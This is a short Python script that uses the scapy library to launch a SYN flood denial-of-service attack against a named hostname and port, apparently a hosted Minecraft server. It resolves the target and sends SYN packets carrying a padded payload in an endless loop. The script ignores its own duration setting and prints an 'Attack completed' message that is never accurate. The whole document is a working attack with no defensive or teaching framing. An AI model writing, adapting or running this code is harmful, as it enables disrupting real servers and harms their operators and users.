from scapy.all import *

target_ip = "Mapsmpchill_outmc.aternos.me" # Replace with the actual target IP or domain
target_port = 60038

try:
 target_ip = socket.gethostbyname(target_ip)
except socket.gaierror:
 print("Invalid target IP address or domain name")
 exit(1)

def syn_flood(target_ip, target_port, duration=10):
 ip = IP(dst=target_ip)
 tcp = TCP(dport=target_port, flags="S")
 raw = Raw(load="X"*1024)
 packet = ip/tcp/raw
 send(packet, loop=1, verbose=0)

print(f"Starting SYN flood attack on {target_ip}:{target_port}")
syn_flood(target_ip, target_port)
print("Attack completed")
